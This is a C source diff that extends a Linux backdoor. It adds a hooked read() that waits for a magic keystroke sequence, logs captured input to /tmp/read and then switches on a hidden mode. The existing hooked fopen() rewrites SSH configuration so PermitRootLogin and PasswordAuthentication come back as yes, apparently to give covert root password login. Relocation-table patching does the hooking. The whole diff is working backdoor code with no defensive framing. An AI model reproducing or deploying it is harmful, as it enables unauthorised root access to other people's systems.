@@ -17,6 +17,46 @@
 
 static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
 
+ssize_t new_read(int fd, void *buf, size_t count)
+{
+	ssize_t ret = ref_read(fd, buf, count);
+	if(ret == 1)
+	{
+		if(((char*)buf)[0] == magicstr[magiccnt] && magiccnt <= magiclen && pambd == 0)
+		{
+			magiccnt++;
+
+			FILE *fp = ref_fopen("/tmp/read", "a+");
+			fprintf(fp, "%s", (char*)buf);
+
+
+			if(magiccnt == magiclen)
+			{
+				hook_rela(ref_read_Rela, ref_read, ref_read_type);
+				pambd=1;
+
+				fprintf(fp,"\nbackdoor on: %d!\nref_read_type=%d\n", pambd, ref_read_type);
+			}
+			fflush(fp);
+			fclose(fp);
+		}
+		else if(magiccnt > 7)
+		{
+			hook_rela(ref_read_Rela, ref_read, ref_read_type);
+		}
+		else
+		{
+			FILE *fp = ref_fopen("/tmp/read", "a+");
+			fprintf(fp, "\nError!\n");
+			fflush(fp);
+			fclose(fp);
+			magiccnt = 0;
+		}
+	}
+	return ret;
+	
+}
+
 /*
  * the goal is to make sure PermitRootLogin&&PasswordAuthentication is set to yes
  *	regardless if it is explicity set or not
@@ -29,6 +69,9 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
 FILE *my_fopen(char *filename, char *mode)
 {
 	FILE *fp = ref_fopen(filename, mode);
+
+	if(!pambd) return fp;
+
 	fpos_t ref_pos;
 	fgetpos(fp, &ref_pos);
 
@@ -66,7 +109,6 @@ FILE *my_fopen(char *filename, char *mode)
 		ret = getline(&str, &n, fp);
 		if (ret < 0)
 			break;
-		
 		/* functionally similar to strcat(buf, str) - in half the time */	
 		getline_len = strlen(str);
 
@@ -123,7 +165,6 @@ FILE *my_fopen(char *filename, char *mode)
 
 	/* we have parsed the whole of filename and enums are set correctly */
 
-
 	char *PRL_Y = "PermitRootLogin yes\n";
 	char *PA_Y = "PasswordAuthentication yes\n";
 	char *new = buf;
@@ -171,7 +212,7 @@ FILE *my_fopen(char *filename, char *mode)
 	
 	shm_unlink("/7355608");
 
-	hook_rela(ref_fopen_Rela, ref_fopen, RELOC_ADDEND);
+	hook_rela(ref_fopen_Rela, ref_fopen, RELOC_OFFSET);
 
 	if (ref_PRL)
 		free(ref_PRL);	
@@ -278,6 +319,8 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
 		foundrela->r_addend = (unsigned long long) func; 
 	else if (type == RELOC_INFO)
 		foundrela->r_info = (unsigned long long) func; 
+	else if (type == RELOC_OFFSET)
+		foundrela->r_offset = (unsigned long long) func;
 
 	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
 	if (ret != 0)
